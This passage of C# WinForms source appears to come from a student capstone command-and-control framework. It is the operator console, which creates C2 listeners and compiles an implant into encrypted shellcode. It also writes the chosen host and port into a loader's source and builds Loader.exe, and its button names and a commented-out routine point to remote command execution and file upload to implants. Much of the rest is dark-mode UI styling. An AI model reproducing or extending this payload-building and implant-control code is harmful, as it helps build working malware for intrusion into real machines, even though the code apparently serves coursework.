                // Handle non-Windows systems if necessary
                Console.WriteLine("This operation is only supported on Windows.");
            }
        }
        private void SaveCompiledLoader()
        {
            string loaderExePath = @"C:\Users\vquer\Desktop\Malware\Capstone\Implementation\Loader\Loader.exe";  // Path of the compiled loader

            using (var saveFileDialog = new SaveFileDialog())
            {
                saveFileDialog.Filter = "EXE Files (*.exe)|*.exe";
                saveFileDialog.DefaultExt = "exe";
                saveFileDialog.AddExtension = true;

                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    try
                    {
                        File.Copy(loaderExePath, saveFileDialog.FileName, true);
                        MessageBox.Show($"Loader.exe has been saved to: {saveFileDialog.FileName}");
                    }
                    catch (Exception)
                    {
                        /*txtPayloadGen.AppendText($"An error occurred: {ex.Message}" + Environment.NewLine);*/
                    }
                }
            }
        }

        private void btnGenerateImplantShellcode_Click(object sender, EventArgs e)
        {
            string basedirWin = "C:\\Users\\vquer\\Desktop\\Malware\\Capstone\\Implementation\\";
            string selectedName = null;
            string selectedHost = null;
            string selectedPort = null;
#pragma warning disable CS0219 // Variable is assigned but its value is never used
            string selectedHeader = null;
#pragma warning restore CS0219 // Variable is assigned but its value is never used

            // Iterate through the DataGridView rows to find the checked row
            foreach (DataGridViewRow row in dgvImplantConfig.Rows)
            {
                bool isChecked = Convert.ToBoolean(row.Cells["Check"].Value);
                if (isChecked)
                {
                    selectedName = row.Cells["Name"].Value.ToString();
                    selectedHost = row.Cells["IP"].Value.ToString();
                    selectedPort = row.Cells["Port"].Value.ToString();

                    break; // Stop the loop once the selected row is found
                }
            }

            // Check if any row was selected
            if (string.IsNullOrEmpty(selectedHost) || string.IsNullOrEmpty(selectedPort))
            {
                MessageBox.Show("Please select a host and port from the list.");
                return;
            }

            CompileAndConvertToShellcode(basedirWin, selectedHost, selectedPort);

            EncryptShellcode(basedirWin);

            string loaderFilePath = Path.Combine(basedirWin, "Loader\\Loader.cs");

            // Handle Loader.cs
            string originalLoaderContents = ReadFileContents(loaderFilePath, "Read original Loader.cs");
            string modifiedLoaderContents = originalLoaderContents
                .Replace("public static string host = \"<IP>\";", $"public static string host = \"{selectedHost}\";")
                .Replace("public static string port = \"<PORT>\";", $"public static string port = \"{selectedPort}\";");

            WriteFileContents(loaderFilePath, modifiedLoaderContents, "Write modified Loader.cs");

            CompileLoader();

            WriteFileContents(loaderFilePath, originalLoaderContents, "Revert Loader.cs changes");
        }



        private void txtConsoleOutput_TextChanged_1(object sender, EventArgs e)
        {

        }

        private void richTextBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private static Random random = new Random();

        public static string GenerateRandomWord(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            StringBuilder result = new StringBuilder(length);
            for (int i = 0; i < length; i++)
            {
                result.Append(chars[random.Next(chars.Length)]);
            }
            return result.ToString();
        }

        /*GENESIS POR AQUI CAGANDOLA */
        private List<Listener> listeners = new List<Listener>();
        private async void button2_Click(object sender, EventArgs e)
        {
            //List<Listener> newListener = new List<Listener>();
            Listener newListener = new Listener();

            newListener.Name = GenerateRandomWord(15);
            newListener.IP = txtBoxIP.Text;
            newListener.Port = txtBoxPort.Text;
            newListener.Header = txtBoxHeader.Text;

            string jsonListener = JsonConvert.SerializeObject(newListener);

            //Solicitud HTTP para enviar el JSON al endpoint 
            using (HttpClient client = new HttpClient())
            {
                var content = new StringContent(jsonListener, Encoding.UTF8, "application/json");

                try
                {
                    HttpResponseMessage response = await client.PostAsync($"http://{host}:{port}/generate/listener", content);
                    //($"http://{host}:{port}/generate/listener");

                    if (response.IsSuccessStatusCode)
                    {
                        //Make a list of the new listener
                        listeners.Add(newListener);

                        // Update de listeners list
                        listBox1.Items.Clear();
                        foreach (var listener in listeners)
                        {
                            listBox1.Items.Add($"Name: {listener.Name}, IP: {listener.IP}, Port: {listener.Port}, Headers: {listener.Header}");
                        }
                        //Successfull response
                        //MessageBox.Show("HTTP Response Success!");
                        //string listenerInfo = $"Name: {newListener.Name}, Host: {newListener.Host}, Port: {newListener.Port}, Headers: {newListener.Headers}";
                    }
                    else
                    {
                        //Error in HTTP response 
                        //MessageBox.Show("HTTP Response Error!");
                    }
                }
                catch (Exception)
                {
                    //Exception error
                    //MessageBox.Show($"Error: {exception.Message}");
                }
            }

        }

        private void button3_Click(object sender, EventArgs e)
        {
            txtBoxIP.Text = "";
            txtBoxPort.Text = "";
            txtBoxHeader.Text = "";
        }

        private async void button4_Click(object sender, EventArgs e)
        {
            // Clear the list of listeners
            listeners.Clear();

            // Clear the listBox1 control
            listBox1.Items.Clear();

            // Create an HttpClient to make the request
            using (var client = new HttpClient())
            {
                try
                {
                    // Assuming you want to make a GET request
                    var response = await client.GetAsync($"http://{host}:{port}/clearListeners");

                    // Optional: Check the response status code
                    if (response.IsSuccessStatusCode)
                    {
                        // Optionally read the response content if needed
                        string responseContent = await response.Content.ReadAsStringAsync();
                        // Do something with the response content if needed
                    }
                    else
                    {
                        // Handle the error
                        //MessageBox.Show($"Request failed with status code: {response.StatusCode}");
                    }
                }
                catch (HttpRequestException)
                {
                    // Handle any exceptions that occurred during the request
                    //MessageBox.Show($"Error making request: {httpRequestException.Message}");
                }
            }
        }


        private void button6_Click_1(object sender, EventArgs e)
        {
            // Restaurar el fondo del formulario a su color original
            this.BackColor = SystemColors.Control;

            // Restaurar el color de fuente de los controles a su color original
            foreach (Control control in this.Controls)
            {
                if (control is Label || control is TextBox || control is DataGridView)
                {
                    control.ForeColor = SystemColors.ControlText;
                }
                if (control is Button)
                {
                    // Cambiar el color de fondo de los botones
                    control.BackColor = SystemColors.Control;
                }
            }

            // Restaurar el color de fondo de los controles a su color original
            foreach (Control control in this.Controls)
            {
                if (control is TextBox || control is DataGridView)
                {
                    control.BackColor = SystemColors.Window;
                }
                if (control is Button)
                {
                    // Cambiar el color de fondo de los botones
                    control.BackColor = SystemColors.Control;
                }
            }
            foreach (TabPage tabPage in fileTab.TabPages)
            {
                tabPage.BackColor = SystemColors.Control;
                tabPage.ForeColor = SystemColors.ControlText;
            }
            // Restaurar el color de fondo del RichTextBox (si tienes uno)
            if (richTextBox1 != null)
            {
                richTextBox1.BackColor = SystemColors.Window;
                richTextBox1.ForeColor = SystemColors.ControlText;
            }

            // Restaurar el color de fondo de los DataGridView (si tienes uno)
            if (dataGridView1 != null)
            {
                dataGridView1.BackgroundColor = SystemColors.Window;
                dataGridView1.DefaultCellStyle.BackColor = SystemColors.Window;
                dataGridView1.ColumnHeadersDefaultCellStyle.BackColor = SystemColors.Control;
                dataGridView1.ColumnHeadersDefaultCellStyle.ForeColor = SystemColors.ControlText;
            }

            label10.ForeColor = Color.Black;
            label11.ForeColor = Color.Black;
            label9.ForeColor = Color.Black;
            groupBox2.ForeColor = Color.Black;
        }

        private void label14_Click(object sender, EventArgs e)
        {

        }

        private void tabPage6_Click(object sender, EventArgs e)
        {

        }

        private void btnDarkMode_Click(object sender, EventArgs e)
        {
            // Set the form's background to a dark color
            this.BackColor = Color.FromArgb(45, 45, 48); // Dark gray color

            // Set the background color of TextBox and DataGridView to a slightly lighter dark color
            foreach (Control control in this.Controls)
            {
                if (control is TextBox || control is DataGridView)
                {
                    control.BackColor = Color.FromArgb(30, 30, 30); // Dark gray
                }
            }
            foreach (TabPage tabPage in fileTab.TabPages)
            {
                tabPage.BackColor = Color.FromArgb(45, 45, 48); // Dark gray
                tabPage.ForeColor = Color.White; // Light text color
            }
            // Set the background and text color of the RichTextBox (if you have one)
            if (richTextBox1 != null)
            {
                richTextBox1.BackColor = Color.FromArgb(30, 30, 30); // Dark gray
                richTextBox1.ForeColor = Color.White; // Light text color
            }

            // Set the background and text color of the DataGridView (if you have one)
            if (dataGridView1 != null)
            {
                dataGridView1.BackgroundColor = Color.FromArgb(30, 30, 30); // Dark gray
                dataGridView1.DefaultCellStyle.BackColor = Color.FromArgb(30, 30, 30); // Dark gray
                dataGridView1.ColumnHeadersDefaultCellStyle.BackColor = Color.FromArgb(45, 45, 48); // Darker gray
                dataGridView1.ColumnHeadersDefaultCellStyle.ForeColor = Color.White; // Light text color
            }

            // Set the background and text color for txtPayloadGen
            txtPayloadGen.BackColor = Color.FromArgb(45, 45, 48); // Dark gray
            txtPayloadGen.ForeColor = Color.White; // White text

            label10.ForeColor = Color.White;
            label11.ForeColor = Color.White;
            label9.ForeColor = Color.White;
            groupBox2.ForeColor = Color.White;

            // Set the background and text color for listBox1
            listBox1.BackColor = Color.FromArgb(45, 45, 48); // Dark gray
            listBox1.ForeColor = Color.White; // White text

            var buttonNames = new HashSet<string> { "button6", "btnDarkMode", "btnSignOut", "btnEditImplant",
            "btnRunCommand", "btnConsole", "btnProcesses", "button1", "btnGetData",
            "btnPayloadGenerate", "btnBundlePayload", "btnGenerateImplantShellcode",
            "btnSendMessage", "button2", "button3", "button4" };

            // Recursively change button text colors in the form
            ChangeButtonTextColors(this.Controls, buttonNames);
            //ApplyDarkModeToSplitContainer();
        }

        private void ChangeButtonTextColors(Control.ControlCollection controls, HashSet<string> buttonNames)
        {
            foreach (Control control in controls)
            {
                // If the control is a button and its name is in the list, change text color
                if (control is Button button && buttonNames.Contains(button.Name))
                {
                    button.ForeColor = Color.Black;
                }

                // If the control contains other controls, recursively change their text colors
                if (control.HasChildren)
                {
                    ChangeButtonTextColors(control.Controls, buttonNames);
                }
            }
        }

        private void btnUploadFile_Click(object sender, EventArgs e)
        {
            /*string filename = Path.GetFileName(lblFileToUploadPath.Text);
            string dir = Path.GetDirectoryName(lblFileToUploadPath.Text);

            Command commandForImplant = new Command();

            commandForImplant.Input = "upload"; // Keep as is
            commandForImplant.command = "."; // Renamed from 'command' to 'Command'
            commandForImplant.Args = filename; // New property, set as needed
            commandForImplant.ImplantUser = userToControl; // Keep as is
            commandForImplant.Operator = operatorName; // Keep as is
            commandForImplant.timeToExec = "0"; // Renamed from 'timeToExec' to 'TimeToExec'
            commandForImplant.delay = "0"; // Renamed from 'delay' to 'Delay'
            
            byte[] fileBytes = File.ReadAllBytes(lblFileToUploadPath.Text);
            string base64File = Convert.ToBase64String(fileBytes);
            commandForImplant.File = base64File;

            commandForImplant.UseSmb = "false"; // New property, set as needed or default

            dynamic jsonCommand = JsonConvert.SerializeObject(commandForImplant);

            richTextBox1.Text = "";
            richTextBox1.Text = jsonCommand;
            sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);*/
        }
    }
}